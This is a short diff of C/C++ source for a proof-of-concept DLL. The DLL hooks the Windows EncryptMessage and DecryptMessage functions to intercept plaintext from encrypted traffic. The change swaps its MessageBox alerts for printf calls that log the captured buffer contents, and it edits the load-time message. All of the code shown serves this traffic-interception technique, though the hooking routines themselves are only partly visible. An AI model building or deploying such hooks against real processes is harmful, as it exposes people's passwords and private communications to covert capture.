@@ -71,7 +71,8 @@ SECURITY_STATUS MyEncryptMessage(
 
 	char* buffer = (char*)((DWORD_PTR)(pMessage->pBuffers->pvBuffer) + 0x29); //Just Hardcode for PoC
 
-	::MessageBoxA(NULL, buffer, "MITM Intercept", 0);
+
+	printf("***HOOKED CAPTURE LOG*** %s", buffer);
 
 	if (WriteMemory(fpEncryptMessage, &bSavedByte, sizeof(BYTE)) == FALSE) {
 		ExitThread(0);
@@ -98,8 +99,8 @@ SECURITY_STATUS MyDecryptMessage(
 
 	char* buffer = (char*)(pMessage->pBuffers->pvBuffer);
 
-	::MessageBoxA(NULL, buffer, "MITM Intercept", 0);
 
+	printf("***HOOKED CAPTURE LOG*** %s", buffer);
 	HookFunction2();
 	return SEC_EntryRet;
 }
@@ -135,7 +136,8 @@ BOOL APIENTRY DllMain(HANDLE hInstance, DWORD fdwReason, LPVOID lpReserved) {
 		AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)MyVectoredExceptionHandler1);
 		HookFunction();
 		HookFunction2();
-		::MessageBoxA(NULL, "Locked and Loaded!", "Boom!", 0);
+
+		printf("Ready To Roll Out!\n");
 		break;
 	}
 
